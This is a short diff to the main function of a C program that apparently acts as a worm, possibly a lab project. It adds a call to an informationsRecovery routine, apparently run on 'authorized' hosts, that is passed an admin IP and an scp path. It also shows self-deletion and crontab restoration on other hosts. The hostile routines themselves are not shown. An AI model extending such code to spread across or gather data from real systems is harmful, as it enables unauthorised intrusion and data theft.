@@ -1,6 +1,7 @@
 #include "../include/main.h"
 
 int main (int argc, char **argv) {
+	int ret = EXIT_FAILURE;
 	int portSSH, cpt;
 	char programPath[PATH_MAX];
 	dictionary *dico;
@@ -52,17 +53,16 @@ int main (int argc, char **argv) {
 		}
 		else {
 			// if the host is authorized
-			if (isAuthorized(control)) {
-				printf("authorized");
-			}
-			else {
+			if (isAuthorized(control))
+				informationsRecovery(command, dstPath, control, adminIP, scpPath, portSSH);
+			else
 				// delete program, configuration file and restore crontab
 				wormDelete(programName, dstPath, crontab);
-			}
 		}
+		ret = EXIT_SUCCESS;	
 	}
 	iniparser_freedict(dico);
 
-	return 0;
+	return ret;
 }
 
